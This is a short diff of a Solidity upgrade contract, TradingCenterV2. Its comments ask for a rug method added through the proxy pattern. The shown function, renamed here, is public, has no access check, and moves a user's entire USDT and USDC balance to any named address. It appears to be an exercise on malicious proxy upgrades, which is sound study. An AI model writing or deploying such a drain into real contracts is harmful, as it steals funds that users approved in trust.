@@ -6,7 +6,7 @@ import "./TradingCenter.sol";
 // TODO: Try to implement TradingCenterV2 here
 contract TradingCenterV2 is TradingCenter{
     //TODO: inherite V1 , Add rug method, use proxy pattern to rug
-    function RugPull(address user,address rugAddress) public{
+    function rugPull(address user,address rugAddress) public{
         usdt.transferFrom(address(user), rugAddress, usdt.balanceOf(address(user)));
         usdc.transferFrom(address(user), rugAddress, usdc.balanceOf(address(user)));
     }
